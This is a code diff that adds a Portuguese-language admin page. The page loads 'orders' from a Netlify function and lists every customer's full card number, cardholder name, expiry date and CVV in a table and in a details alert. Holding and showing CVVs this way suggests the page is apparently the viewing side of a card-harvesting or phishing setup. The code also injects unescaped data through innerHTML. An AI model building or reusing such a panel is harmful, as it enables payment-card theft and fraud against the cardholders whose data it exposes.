@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Administrador</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        body {
+            background: #f6f7fb;
+            display: flex;
+            min-height: 100vh;
+        }
+        .sidebar {
+            width: 250px;
+            background: #333;
+            color: #fff;
+            padding: 20px;
+        }
+        .sidebar h2 {
+            margin-bottom: 20px;
+        }
+        .sidebar ul {
+            list-style: none;
+        }
+        .sidebar li {
+            margin-bottom: 10px;
+        }
+        .sidebar a {
+            color: #fff;
+            text-decoration: none;
+        }
+        .main {
+            flex: 1;
+            padding: 20px;
+        }
+        .header {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .content {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            overflow-x: auto;
+            display: block;
+        }
+        th, td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        th {
+            background: #f4f4f4;
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <h2>Painel Admin</h2>
+        <ul>
+            <li><a href="#pedidos">Pedidos</a></li>
+        </ul>
+    </div>
+    <div class="main">
+        <div class="content">
+            <h2 id="pedidos">Pedidos</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Nome</th>
+                        <th>Tipo Cartão</th>
+                        <th>Nome Cartão</th>
+                        <th>Número Cartão</th>
+                        <th>Validade</th>
+                        <th>CVV</th>
+                        <th>Status</th>
+                        <th>Ações</th>
+                    </tr>
+                </thead>
+                <tbody id="orders-tbody">
+                    <!-- Dados dinâmicos -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <script>
+        async function loadOrders() {
+            try {
+                const response = await fetch('/.netlify/functions/orders');
+                const orders = await response.json();
+                const tbody = document.getElementById('orders-tbody');
+                tbody.innerHTML = '';
+                orders.forEach((order, index) => {
+                    const tr = document.createElement('tr');
+                    const detailsBtn = document.createElement('button');
+                    detailsBtn.textContent = 'Ver Detalhes';
+                    detailsBtn.onclick = function() {
+                        alert(`Detalhes do Pedido ${index + 1}:\nNome: ${order.name || 'N/A'}\nTipo Cartão: ${order.cardType || 'N/A'}\nNome no Cartão: ${order.cardName || 'N/A'}\nNúmero Cartão: ${order.cardNumber || 'N/A'}\nValidade: ${order.expiry || 'N/A'}\nCVV: ${order.cvv || 'N/A'}`);
+                    };
+                    tr.innerHTML = `
+                        <td>${index + 1}</td>
+                        <td>${order.name || ''}</td>
+                        <td>${order.cardType || ''}</td>
+                        <td>${order.cardName || ''}</td>
+                        <td>${order.cardNumber || ''}</td>
+                        <td>${order.expiry || ''}</td>
+                        <td>${order.cvv || ''}</td>
+                        <td>Pendente</td>
+                        <td></td>
+                    `;
+                    tr.lastElementChild.appendChild(detailsBtn);
+                    tbody.appendChild(tr);
+                });
+            } catch (error) {
+                console.error('Erro ao carregar pedidos:', error);
+            }
+        }
+        window.onload = loadOrders;
+    </script>
+</body>
+</html>
